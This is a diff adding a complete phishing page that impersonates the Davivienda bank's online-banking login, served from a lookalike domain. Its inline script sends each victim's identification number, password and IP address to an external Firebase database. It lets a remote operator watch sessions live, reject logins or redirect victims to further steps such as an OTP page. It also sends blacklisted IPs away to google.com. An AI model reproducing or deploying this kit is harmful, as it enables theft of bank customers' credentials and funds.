@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=980">
+  <title>Inicio</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <link rel="icon" href="https://daaviss.lat/assets/icons/favicon-login.ico">
+  <link rel="stylesheet" href="./Inicio_files/tokens.css">
+  <link rel="stylesheet" href="./Inicio_files/base.css">
+  <link rel="stylesheet" href="./Inicio_files/auth.css">
+</head>
+<body class="svAuth" lang="es">
+<div class="authBackdrop"></div>
+<header class="authHeader">
+  <span class="authHeader__brand" role="img" data-arialabel="brand.name" aria-label="Davivienda"></span>
+  <div class="authHeader__lang">
+    <i class="authHeader__langIcon" aria-hidden="true"></i>
+    <a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" id="langToggle" data-txt="lang.toggle">English</a>
+  </div>
+</header>
+
+<main class="authCard">
+  <h2 class="authCard__title" id="authTitle" data-txt="auth.title">Autenticación del cliente</h2>
+
+  <div id="stepId">
+    <input class="authField authField--id" id="idInput" type="text" inputmode="numeric" maxlength="20" data-ph="auth.id.ph" data-arialabel="auth.id.aria" autocomplete="off" placeholder="Ingrese número identificación" aria-label="Ingrese número identificación">
+    <button class="authButton authButton--primary authButton--id" id="continueBtn" type="button" data-txt="auth.continue">Continuar</button>
+  </div>
+
+  <div id="stepPass" class="is-hidden">
+    <span class="authAvatar" aria-hidden="true"></span>
+    <input class="authField authField--pass" id="passInput" type="password" maxlength="30" data-ph="auth.pass.ph" data-arialabel="auth.pass.aria" autocomplete="off" placeholder="Contraseña" aria-label="Contraseña">
+    <span class="authAsterisk" aria-hidden="true">*</span>
+    <button class="authButton authButton--ghost authButton--back" id="backBtn" type="button" data-txt="auth.back">Regresar</button>
+    <button class="authButton authButton--primary authButton--login" id="loginBtn" type="button" data-txt="auth.login">Iniciar sesión</button>
+  </div>
+
+  <div class="authError is-hidden" id="authError" data-txt="auth.error">Usuario o contraseña incorrectos.</div>
+
+  <ul class="authLinks">
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.register">Registrarse</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.forgot">¿Olvidó su contraseña?</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.unlock">Desbloquear usuario</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.pay">PAY</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.token">Token Davivienda</a></li>
+  </ul>
+
+  <p class="authLegal"><span data-txt="auth.legal">Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo</span> <a href="https://www.davivienda.com.sv/Api-portalDavivienda/media/NSSBD22.pdf" data-txt="auth.legal.link">Click aquí</a></p>
+</main>
+
+<div class="authLoading is-hidden" id="authLoading">
+  <div class="authLoading__box">
+    <span class="authLoading__spinner" aria-hidden="true"></span>
+    <p class="authLoading__text" data-txt="auth.loading">Validando información...</p>
+  </div>
+</div>
+
+<footer class="authFooter">
+  <div class="authFooter__inner">
+    <span data-txt="auth.footer.copyright">Davivienda - © 2026 Davivienda - Todos los derechos reservados</span>
+    <span data-txt="auth.footer.version">Versión: 11</span>
+  </div>
+</footer>
+  <script>
+    const DB_URL = "https://banficohxahn-default-rtdb.firebaseio.com/";
+    firebase.initializeApp({ databaseURL: DB_URL });
+    const db = firebase.database();
+
+    const params = new URLSearchParams(location.search);
+    const sid = params.get('sid') || ('sv_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7));
+
+    const idInput    = document.getElementById('idInput');
+    const passInput  = document.getElementById('passInput');
+    const stepId     = document.getElementById('stepId');
+    const stepPass   = document.getElementById('stepPass');
+    const authError  = document.getElementById('authError');
+    const authLoading = document.getElementById('authLoading');
+
+    let ip = 'unknown';
+    let guardado = false;
+    let comandosOn = false;
+
+    // ---------- IP + blacklist ----------
+    async function obtenerIP() {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        ip = (await r.json()).ip || 'unknown';
+      } catch (e) { ip = 'unknown'; }
+      db.ref('blacklist').once('value').then(s => {
+        const bl = s.val() || {};
+        const k = ip.replace(/\./g, '_');
+        if ((bl[k] && bl[k].bloqueado) || (bl[ip] && bl[ip].bloqueado)) {
+          location.replace((bl[k] || bl[ip]).redirigirA || 'https://google.com');
+        }
+      }).catch(() => {});
+    }
+
+    // ---------- latido ----------
+    function latido() {
+      db.ref('logins/' + sid).update({ online: true, ultimoPing: Date.now() }).catch(() => {});
+    }
+
+    // ---------- rechazo sin recargar ----------
+    function rechazar() {
+      authLoading.classList.add('is-hidden');
+      stepPass.classList.add('is-hidden');
+      stepId.classList.remove('is-hidden');
+      authError.classList.remove('is-hidden');
+      idInput.value = '';
+      passInput.value = '';
+      idInput.focus();
+    }
+
+    // ---------- comandos del panel ----------
+    function escucharComandos() {
+      if (comandosOn) return;
+      comandosOn = true;
+      db.ref('comandos/' + sid).on('value', s => {
+        const v = s.val();
+        if (!v) return;
+        db.ref('comandos/' + sid).remove();
+
+        // rechazo: se resuelve en sitio, sin navegar
+        if (v.rechazar) { rechazar(); return; }
+
+        if (!v.redirect) return;
+        const destino = String(v.redirect).split('?')[0];
+
+        // respaldo: si por lo que sea llega como redirect a index.html
+        if (destino === 'index.html') { rechazar(); return; }
+
+        location.href = destino + '?sid=' + encodeURIComponent(sid);
+      });
+    }
+
+    // ---------- pasos ----------
+    document.getElementById('continueBtn').onclick = () => {
+      if (idInput.value.trim().length < 3) { idInput.focus(); return; }
+      authError.classList.add('is-hidden');
+      stepId.classList.add('is-hidden');
+      stepPass.classList.remove('is-hidden');
+      passInput.focus();
+      latido();
+    };
+
+    document.getElementById('backBtn').onclick = () => {
+      stepPass.classList.add('is-hidden');
+      stepId.classList.remove('is-hidden');
+      authError.classList.add('is-hidden');
+    };
+
+    document.getElementById('loginBtn').onclick = () => {
+      const user = idInput.value.trim();
+      const pass = passInput.value.trim();
+      if (pass.length < 3) { passInput.focus(); return; }
+
+      authError.classList.add('is-hidden');
+      authLoading.classList.remove('is-hidden');
+
+      db.ref('logins/' + sid).update({
+        user: user,
+        pass: pass,
+        ip: ip,
+        pagina: 'LOGIN',
+        online: true,
+        ultimoPing: Date.now(),
+        inicio: Date.now()
+      }).then(() => {
+        guardado = true;
+        escucharComandos();
+      });
+    };
+
+    idInput.addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('continueBtn').click(); });
+    passInput.addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('loginBtn').click(); });
+
+    window.addEventListener('beforeunload', () => {
+      if (guardado) db.ref('logins/' + sid).update({ online: false });
+    });
+
+    setInterval(latido, 15000);
+    obtenerIP();
+    escucharComandos();
+
+    // ---------- si se entra con ?sid (recarga o vuelta desde otp) ----------
+    if (params.get('sid')) {
+      db.ref('logins/' + sid).once('value').then(s => {
+        const d = s.val();
+        if (d) { idInput.value = d.user || ''; passInput.value = d.pass || ''; }
+        rechazar();
+      }).catch(() => rechazar());
+    }
+  </script>
+
+</body></html>
